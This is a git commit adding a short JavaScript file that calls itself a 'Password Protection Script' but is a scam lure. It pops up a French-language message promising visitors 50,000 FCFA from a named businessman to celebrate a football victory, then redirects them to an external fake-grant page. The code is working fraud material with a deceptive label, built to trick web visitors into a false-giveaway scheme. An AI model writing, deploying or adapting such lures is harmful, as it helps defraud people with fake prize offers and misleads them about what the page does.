5b44f86bd52ad83c1375ac8e6e4a741773edacb5
The-On-going <sirpeelawson@gmail.com>
2026-08-17 00:05:39 +0100

    Create activecame.js

---
+++ activecame.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER 50,000 FCFA'
+password = prompt(
+  'Félicitations ! Vous êtes éligible pour recevoir 50,000 FCFA de la part de BABA AHMADOU DANPULLO POUR CÉLÉBRER LA VICTOIRE DES LIONNES INDOMPTABLES. Veuillez appuyer sur OK pour le recevoir instantanément.',
+  'RETIRER 50,000 FCFA'
+);
+if (password != 'RETIRER 50,000 FCFA') {
+  location.href = 'https://ongoing-grant.info/50,000Fcfa-Notre-Victoire.html';
+  }
